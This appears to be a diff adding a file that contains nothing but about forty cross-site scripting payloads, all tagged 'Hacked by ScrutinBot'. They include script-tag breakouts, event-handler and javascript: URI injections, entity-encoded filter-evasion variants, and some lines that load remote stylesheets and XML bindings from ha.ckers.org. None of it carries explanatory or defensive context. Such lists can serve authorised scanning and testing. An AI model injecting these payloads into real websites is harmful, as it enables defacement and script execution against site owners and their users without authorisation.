@@ -1,0 +1,38 @@
+"""><script>alert('Hacked by Scrutin')</script>
+"""><script>alert("Hacked by ScrutinBot");</script>
+""">javascript:alert("Hacked by ScrutinBot")
+"""><img src="javascript:alert('Hacked by ScrutinBot');">
+"""><img src=javascript:alert(&quot;Hacked by ScrutinBot&quot;)>
+"""><IFRAME SRC="javascript:alert('Hacked by ScrutinBot');"></IFRAME><SCRIPT a=">" SRC="Hacked by ScrutinBot"></SCRIPT>
+"""><SCRIPT a=">" '' SRC="Hacked by ScrutinBot"></SCRIPT>
+"""><SCRIPT "a='>'" SRC="Hacked by ScrutinBot"></SCRIPT>
+"""><SCRIPT a=">'>" SRC="Hacked by ScrutinBot"></SCRIPT>
+"""><SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="Hacked by ScrutinBot"></SCRIPT>
+"""><<SCRIPT>alert("Hacked by ScrutinBot");//<</SCRIPT>
+"""><h1><font color=blue>Hacked by ScrutinBot</h1>
+"""><BODY ONLOAD=alert('Hacked by ScrutinBot')>
+"""><input onfocus=write(Hacked by ScrutinBot) autofocus>
+"""><input onblur=write(Hacked by ScrutinBot) autofocus><input autofocus>
+"""><body onscroll=alert(Hacked by ScrutinBot)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
+"""><form><button formaction="javascript:alert(Hacked by ScrutinBot)">lol
+"""><!--<img src="--><img src=x onerror=alert(Hacked by ScrutinBot)//">
+"""><![><img src="]><img src=x onerror=alert(Hacked by ScrutinBot)//">
+"""><style><img src="</style><img src=x onerror=alert(Hacked by ScrutinBot)//">
+""">&lt;SCRIPT&gt;alert(/Hacked by ScrutinBot/&#46;source)&lt;/SCRIPT&gt;
+""">\\";alert('Hacked by ScrutinBot');//
+""">&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(\"Hacked by ScrutinBot\");&lt;/SCRIPT&gt;
+""">&lt;INPUT TYPE=\"IMAGE\" SRC=\"javascript&#058;alert('Hacked by ScrutinBot');\"&gt;
+""">&lt;BODY BACKGROUND=\"javascript&#058;alert('Hacked by ScrutinBot')\"&gt;
+""">&lt;BODY ONLOAD=alert('Hacked by ScrutinBot')&gt;
+""">&lt;IMG DYNSRC=\"javascript&#058;alert('Hacked by ScrutinBot')\"&gt;
+""">&lt;IMG LOWSRC=\"javascript&#058;alert('Hacked by ScrutinBot')\"&gt;
+""">&lt;BGSOUND SRC=\"javascript&#058;alert('Hacked by ScrutinBot');\"&gt;
+""">&lt;BR SIZE=\"&{alert('Hacked by ScrutinBot')}\"&gt;
+""">&lt;LINK REL=\"stylesheet\" HREF=\"javascript&#058;alert('Hacked by ScrutinBot');\"&gt;
+""">&lt;LINK REL=\"stylesheet\" HREF=\"http&#58;//ha&#46;ckers&#46;org/Hacked by ScrutinBot&#46;css\"&gt;
+""">&lt;STYLE&gt;@import'http&#58;//ha&#46;ckers&#46;org/Hacked by ScrutinBot&#46;css';&lt;/STYLE&gt;
+""">&lt;META HTTP-EQUIV=\"Link\" Content=\"&lt;http&#58;//ha&#46;ckers&#46;org/Hacked by ScrutinBot&#46;css&gt;; REL=stylesheet\"&gt;
+""">&lt;STYLE&gt;BODY{-moz-binding&#58;url(\"http&#58;//ha&#46;ckers&#46;org/Hacked by ScrutinBotmoz&#46;xml#Hacked by ScrutinBot\")}&lt;/STYLE&gt;
+""">&lt;Hacked by ScrutinBot STYLE=\"behavior&#58; url(Hacked by ScrutinBot&#46;htc);\"&gt;
+""">&lt;STYLE&gt;li {list-style-image&#58; url(\"javascript&#058;alert('Hacked by ScrutinBot')\");}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;Hacked by ScrutinBot
+""">&lt;IMG SRC='vbscript&#058;msgbox(\"Hacked by ScrutinBot\")'&gt;
